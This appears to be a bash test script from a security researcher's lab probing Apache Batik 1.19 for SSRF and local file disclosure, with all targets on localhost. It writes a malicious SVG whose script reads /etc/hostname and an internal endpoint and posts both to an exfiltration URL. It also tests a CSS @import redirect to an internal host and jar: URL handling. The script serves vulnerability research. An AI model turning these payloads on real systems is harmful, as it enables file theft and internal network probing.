#!/bin/bash
# Additional-analysis live tests (Round 6) — Apache Batik 1.19
# A) F-3 live: full ScriptingEnvironment (dynamic JSVGComponent) — window.getURL/postURL
#    file read + cross-host SSRF + exfil, with embedder-enabled scripting (populated whitelist).
# B) CSS @import redirect (F-1 variant through batik-css Parser.openStreamRaw fetch).
# C) jar: scheme matrix under file: document: jar:file local entry read; jar:http blocked.
set -u
cd /tmp/batik-lab
LAB=/tmp/batik-lab
CP=$(ls $LAB/batik-1.19/lib/*.jar | tr "\n" ":")

############################ servers ############################
cat > $LAB/t10servers.py << 'PY'
import http.server, threading, socketserver, json
LOG = []
class H8000(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/f3.svg":
            svg = open("/tmp/batik-lab/f3dyn.svg","rb").read()
            self.send_response(200); self.send_header("Content-Type","image/svg+xml")
            self.send_header("Content-Length",str(len(svg))); self.end_headers(); self.wfile.write(svg)
        elif self.path == "/redircss":
            self.send_response(302)
            self.send_header("Location", "http://127.0.0.1:9999/leak.css")
            self.end_headers()
        else:
            self.send_response(404); self.end_headers()
    def log_message(self,*a): pass
class H9999(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        LOG.append(("GET", self.path))
        print("SRV9999 GET %s" % self.path, flush=True)
        if self.path == "/leak.css":
            css = b".s { fill: rgb(255,0,0); }"
            self.send_response(200); self.send_header("Content-Type","text/css")
            self.send_header("Content-Length",str(len(css))); self.end_headers(); self.wfile.write(css)
        elif self.path == "/secret-internal":
            body = b"INTERNAL-SECRET-RESPONSE-41c2e"
            self.send_response(200); self.send_header("Content-Type","text/plain")
            self.send_header("Content-Length",str(len(body))); self.end_headers(); self.wfile.write(body)
        elif self.path.startswith("/exfil"):
            body = b"OK"
            self.send_response(200); self.send_header("Content-Length","2"); self.end_headers(); self.wfile.write(body)
        else:
            self.send_response(404); self.end_headers()
    def do_POST(self):
        n = int(self.headers.get("Content-Length","0"))
        data = self.rfile.read(n)
        LOG.append(("POST", self.path, data[:400]))
        print("SRV9999 POST %s BODY=%r" % (self.path, data[:400]), flush=True)
        self.send_response(200); self.send_header("Content-Length","2"); self.end_headers(); self.wfile.write(b"OK")
    def log_message(self,*a): pass
def serve(port,h):
    socketserver.TCPServer.allow_reuse_address=True
    with socketserver.TCPServer(("127.0.0.1",port),h) as s: s.serve_forever()
threading.Thread(target=serve,args=(8000,H8000),daemon=True).start()
threading.Thread(target=serve,args=(9999,H9999),daemon=True).start()
import time
time.sleep(120)
PY
python3 $LAB/t10servers.py > $LAB/t10servers.log 2>&1 &
SRVPID=$!
sleep 1

############################ A) F-3 dynamic ############################
cat > $LAB/f3dyn.svg << 'SVG'
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="40">
  <rect width="40" height="40" fill="blue"/>
  <script type="text/ecmascript"><![CDATA[
    function exfil(tag, content) {
      try { window.postURL('http://127.0.0.1:9999/exfil-'+tag, content, function(){}); } catch(e) { }
    }
    window.getURL('file:///etc/hostname', function(r) { exfil('file', r.content); });
    window.getURL('http://127.0.0.1:9999/secret-internal', function(r) { exfil('internal', r.content); });
  ]]></script>
</svg>
SVG
cat > $LAB/F3DynProbe.java << 'JAVA'
import org.apache.batik.swing.svg.JSVGComponent;
import org.apache.batik.swing.svg.SVGUserAgentAdapter;
import org.apache.batik.anim.dom.SAXSVGDocumentFactory;
import org.apache.batik.util.XMLResourceDescriptor;
import org.w3c.dom.svg.SVGDocument;
import java.io.*;
public class F3DynProbe {
  public static void main(String[] a) throws Exception {
    System.setProperty("java.awt.headless","true");
    org.apache.batik.script.rhino.RhinoClassShutter.WHITELIST.add(".*"); // embedder enables scripting
    String parser=XMLResourceDescriptor.getXMLParserClassName();
    SAXSVGDocumentFactory df=new SAXSVGDocumentFactory(parser);
    SVGDocument doc=df.createSVGDocument("http://127.0.0.1:8000/f3.svg", new FileInputStream("/tmp/batik-lab/f3dyn.svg"));
    JSVGComponent comp=new JSVGComponent(new SVGUserAgentAdapter(), true, true);
    comp.setSize(40,40);
    comp.setSVGDocument(doc);
    System.out.println("doc set; waiting for UpdateManager/scripts/getURL...");
    Thread.sleep(10000);
    System.out.println("DONE_WAIT");
  }
}
JAVA
javac -cp "$CP" -d $LAB $LAB/F3DynProbe.java 2>&1 | head -3
echo "=== A) F3 dynamic (getURL file+internal, postURL exfil) ==="
timeout 40 java -cp "$CP:$LAB" F3DynProbe 2>&1 | grep -v "Requested\|Found\|Font" | head -10

############################ B) CSS @import redirect ############################
cat > $LAB/cssredir.svg << 'SVG'
<svg xmlns="http://www.w3.org/2000/svg" width="60" height="60">
  <style>@import url("http://127.0.0.1:8000/redircss");</style>
  <rect class="s" x="0" y="0" width="60" height="60" fill="rgb(0,0,255)"/>
</svg>
SVG
cat > $LAB/cssctl.svg << 'SVG'
<svg xmlns="http://www.w3.org/2000/svg" width="60" height="60">
  <rect class="s" x="0" y="0" width="60" height="60" fill="rgb(0,0,255)"/>
</svg>
SVG
echo "=== B) CSS @import redirect (302 -> internal leak.css, .s fill red) ==="
java -cp "$CP:$LAB" BatikProbe $LAB/cssredir.svg "http://127.0.0.1:8000/cssredir.svg" 2>&1 | grep -v "Requested\|Found" | tail -2
cp $LAB/probe.out.png $LAB/cssredir.png
java -cp "$CP:$LAB" BatikProbe $LAB/cssctl.svg "http://127.0.0.1:8000/cssctl.svg" 2>&1 | grep -v "Requested\|Found" | tail -2
cp $LAB/probe.out.png $LAB/cssctl.png
cat > $LAB/PixCheck.java << 'JAVA'
import javax.imageio.ImageIO; import java.io.File; import java.awt.image.BufferedImage;
public class PixCheck {
  public static void main(String[] a) throws Exception {
    BufferedImage i = ImageIO.read(new File(a[0]));
    int c = i.getRGB(30,30);
    System.out.println(a[0]+" center pixel: r="+((c>>16)&255)+" g="+((c>>8)&255)+" b="+(c&255));
  }
}
JAVA
javac -cp "$CP" -d $LAB $LAB/PixCheck.java
java -cp "$CP:$LAB" PixCheck $LAB/cssredir.png
java -cp "$CP:$LAB" PixCheck $LAB/cssctl.png

############################ C) jar: matrix ############################
mkdir -p /tmp/jarwork && cd /tmp/jarwork
printf 'fake' > in.txt
python3 -c "
import zlib,struct,os
def mk(path):
    files={'in.svg':b'<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"10\" height=\"10\"><rect width=\"10\" height=\"10\" fill=\"lime\"/><secret id=\"k\">JAR-ENTRY-TEXT-aa17</secret></svg>'}
    import zipfile; zipfile.ZipFile('/tmp/batik-lab/t10.zip','w').writestr('in.svg',files['in.svg'])
mk('/tmp/batik-lab/t10.zip')
"
cd $LAB
cat > $LAB/jarfile.svg << 'SVG'
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" height="20">
  <image xlink:href="jar:file:/tmp/batik-lab/t10.zip!/in.svg" x="0" y="0" width="20" height="20"/>
</svg>
SVG
cat > $LAB/jarhttp.svg << 'SVG'
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" height="20">
  <image xlink:href="jar:http://127.0.0.1:9999/evil.jar!/in.svg" x="0" y="0" width="20" height="20"/>
</svg>
SVG
echo "=== C1) jar:file: local zip entry under file: doc (expect gate PASS) ==="
timeout 30 java -cp "$CP:$LAB" BatikProbe $LAB/jarfile.svg "file:/tmp/batik-lab/jarfile.svg" 2>&1 | grep -v "Requested\|Found" | tail -2
echo "=== C2) jar:http:// from file: doc (expect BLOCKED by inner-host reparse) ==="
timeout 30 java -cp "$CP:$LAB" BatikProbe $LAB/jarhttp.svg "file:/tmp/batik-lab/jarhttp.svg" 2>&1 | grep -v "Requested\|Found" | tail -3

sleep 1
echo "=== server log ==="
cat $LAB/t10servers.log
kill $SRVPID 2>/dev/null
true
